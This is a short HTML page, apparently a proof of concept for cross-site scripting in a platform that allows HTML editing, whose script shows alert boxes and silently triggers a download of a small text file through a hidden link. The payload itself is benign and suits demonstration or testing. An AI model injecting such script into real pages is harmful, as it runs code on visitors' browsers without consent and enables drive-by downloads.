<!DOCTYPE html>
<html>
  <head>
    <title>
      XSS
    </title>
  </head>
  <body>
    <script>
      alert("Cross Site Scripting attack!");
      alert("Because canvas allows html editing I added a small iframe!");
      filename="haha.txt";
      filedata="XSS";
      var blob = new Blob([filedata],{"type":"octet/stream"});
      var a = document.createElement('a');
      document.body.append(a);
      a.style="display: none;";
      a.href=window.URL.createObjectURL(blob);
      a.download=filename;
      
      a.click();
    </script>
  </body>
</html>
